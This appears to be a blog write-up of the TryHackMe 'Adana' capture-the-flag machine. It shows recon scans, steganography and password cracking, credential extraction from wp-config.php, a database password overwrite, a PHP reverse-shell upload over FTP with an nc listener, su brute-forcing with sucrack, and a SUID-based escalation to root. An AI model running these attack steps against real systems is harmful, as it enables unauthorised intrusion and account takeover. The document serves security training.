---
title: "Adana THM Writeup"
date: 2023-10-20 00:00:00 +0800
categories: [THM Writeup]
tags: [Writeup]
---

![img-description](/assets/img/adana.jpeg)
_Adana_

Adana is a music by Tryhackme with a title, it has to be a different CTF, let's see

# Recon
nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.233.21 -oG allports

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-20 00:24 -04
Initiating SYN Stealth Scan at 00:24
Scanning 10.10.233.21 [65535 ports]
Discovered open port 80/tcp on 10.10.233.21
Discovered open port 21/tcp on 10.10.233.21
Completed SYN Stealth Scan at 00:24, 23.48s elapsed (65535 total ports)
Nmap scan report for 10.10.233.21
Host is up, received user-set (0.35s latency).
Scanned at 2023-10-20 00:24:34 -04 for 23s
Not shown: 43406 closed tcp ports (reset), 22127 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

we found two open ports
80 HTTP - 21 FTP

# Service & Version

```bash
nmap -sCV -p21,80 10.10.233.21 -oN scanned
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-20 00:26 -04
Nmap scan report for 10.10.233.21
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
|_http-title: Hello World &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.27 seconds
```

# FTP Recon

From what we see the FTP service uses a version vsftpd 3.0.3

Accessing as anonymous gives me permission denied so access cannot be started with the anonymous user

![img-description](/assets/img/anonymous.png)
_FTP ACCESS_

# HTTP Recon

```bash
❯ curl -v -I http://10.10.233.21/
*   Trying 10.10.233.21:80...
* Connected to 10.10.233.21 (10.10.233.21) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.233.21
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 20 Oct 2023 21:02:48 GMT
Date: Fri, 20 Oct 2023 21:02:48 GMT
< Server: Apache/2.4.29 (Ubuntu)
Server: Apache/2.4.29 (Ubuntu)
< Link: <http://adana.thm/index.php/wp-json/>; rel="https://api.w.org/"
Link: <http://adana.thm/index.php/wp-json/>; rel="https://api.w.org/"
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

< 
* Connection #0 to host 10.10.233.21 left intact
```

the adana.thm subdomain is obtained
we add it to /etc/hosts like:

```bash
echo "10.10.233.21 adana.thm" >> /etc/hosts
```
and if we look at the server it runs wordpress with a version of: 5.6 (outdated)

# Directory Brute Force
running wfuzz, against this serve I get:

![img-description](/assets/img/wfuzz_adana.png)
_WFUZZ_


so we found a lot of potential routes but the one I pay attention to the most is: /announcements

![img-description](/assets/img/announ_adana.png)
_Announcements_

We download these files and check it

austrailian-bulldog-ant.jpg: jpg format file, suspected of steganography

so we check it with:

```bash
steghide info austrailian-bulldog-ant.jpg

"austrailian-bulldog-ant.jpg":
  formato: jpeg
  capacidad: 3,6 KB
�Intenta informarse sobre los datos adjuntos? (s/n)

```

so effectively, we must obtain the safe passage, with brute force, the perfect utility is "stegcracker", also the wordlist.txt 
file with a maximum of 50,000 passwords gives us a great clue

![img-description](/assets/img/cracked_adana.png)
_Cracked_

We hack it successfully, and we see a clear text credentials


```bash
❯ cat user-pass-ftp.txt |base64 -d;echo
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

# FTP connection

```bash
❯ ftp adana.thm
Connected to adana.thm.
220 (vsFTPd 3.0.3)
Name (adana.thm:m3y): hakanftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
ftp> 
```

we download the wp-config.php file
and we see clear credentials, if we remember we find a phpmyadmin route which is the database, we access

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         ':Nl5_18W@|(P)/6TZ^p-%PE5qb$v/GB/b e737GB<ubx*O}u8yGPE:eeFD#PT1RE' );
define( 'SECURE_AUTH_KEY',  '@[5K4Q%_gsP%x=QJ]#-lX`BXVNSu7o}5=ht}L~/t%Txt Gx+<BX=,MeiiCHcXvc^' );
define( 'LOGGED_IN_KEY',    ',;0^d77wq7mtnGM1o%WaN.MpMJ9Zj69sI^)2cIVdR3h>YP/S:~SrIn+0AY$Adz.K' );
define( 'NONCE_KEY',        '8)iFPNlnC3vyN1Gj4zd:0(Jp@!8{=heP/G[L/B*>j9SvjNVn,Ei?oqdp2@<:mb0l' );
define( 'AUTH_SALT',        'QSh/V/w-X~/P7!d),h7.Ax>>5/b3Go^^b*hB7:>>&]VIo 00iI>9k_^ Ent^F?- ' );
define( 'SECURE_AUTH_SALT', '>,V>-2!VKaBkkeRd|K&!([%}!;TfeA`@ikjcC/[]:: $.K&L.-`gk_3%t5/fu_Zd' );
define( 'LOGGED_IN_SALT',   'BOk(mP#GI:/ApR/z#w]p<-{smWKoG]qW=gAFR:W=tp_EVb:TN!@cVidma6l@2R$s' );
define( 'NONCE_SALT',       '<9l}/$WEnbVG<;%6#*/bqEZ]x%ZO/mA#.Gy{r-*q|cY,@0,m.rs4 [@]AN_:*/zh' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

We found another subdomain: asd.thm so we added it to the file: "/etc/hosts"

we find a hash in the phpmyadmin db we crack it, with "Hashcat"

After a long time I realized that the password is very complex so entering the "dashboard" could be another game.

I realized late that the password is too complex to crack, but we can make another play, if we are in the db, we can update the user's password, if you don't have wordpress you can use Bcrypt since the wordpress hashes are very close, here a script that generates it:

```php
<?php
$password = 'pwned123';
$hash = password_hash($password, PASSWORD_BCRYPT);
echo $hash;
?>
```

# Getting Reverse Shell

At this point in the dashboard, we will not be able to load a revshell due to permissions but if we remember in the ftp we had write and read permissions so a shell can be loaded there

```php
ftp 10.10.140.187
Connected to 10.10.140.187.
220 (vsFTPd 3.0.3)
Name (10.10.140.187:m3y): hakanftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put rev-shell.php
local: rev-shell.php remote: rev-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5490 bytes sent in 0.00 secs (33.5620 MB/s)
ftp> chmod +x rev-shell.php
200 SITE CHMOD command ok.
ftp> chmod 700 rev-shell.php
200 SITE CHMOD command ok.
```


If we see the wp_options in the phpmyadmin, we see that this file will not point to adana.thm but to subdomain.adana.thm

Execute Rev Shell
we run it with: http://subdomain.adana.thm/rev-shell.php


Listen:
rlwrap nc -nlvp 1234

When I accessed it, listing from www-data I realized I could brute force it with sudo so I used sucrack

# hakanbey Access

```sh
www-data@ubuntu:/tmp/$ ./sucrack -w 128 -u hakanbey newlist.txt
<k/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
password is: 123adanasubaru

www-data@ubuntu:/tmp/$ su hakanbey
Password: 123adanasubaru
```

# Privilege escalation

```sh
find  / -type f -perm -u=s 2>/dev/null
```

we get:  /usr/bin/binary

Doing strings on the binary, we get the following interesting information.

```sh
I think you should enter the correct string here ==>
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
Unable to copy!
```

Aha, looks like something is revealed, we should try that:

```sh
hakanbey@ubuntu:/tmp$ /usr/bin/binary
I think you should enter the correct string here ==><HIDDEN>
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

We have another jpg, with instructions to look at it with a hexeditor, then something to do with CyberChef. First we get the file on to machine

```sh
hakanbey@ubuntu:/tmp$ cp /home/hakanbey/root.jpg /var/www/subdomain/
```

Get the file:

```sh
ftp> get root.jpg
local: root.jpg remote: root.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.jpg (45835 bytes).
226 Transfer complete.
45835 bytes received in 0.06 secs (811.5152 kB/s)
```

Hexeditor:

```bash
xxd -l 50 root.jpg 
```

Now it makes sense, so just need to paste our HEX in to CyberChef and convert to Base85:

With the root password we can now go back to our shell on the server and switch user to grab the last flag:

```sh
www-data@ubuntu:/$ su root
su root
Password: <HIDDEN>

root@ubuntu:/# cat /root/root.txt
cat /root/root.txt
THM{<HIDDEN>}
```


Booom Rooted!!!!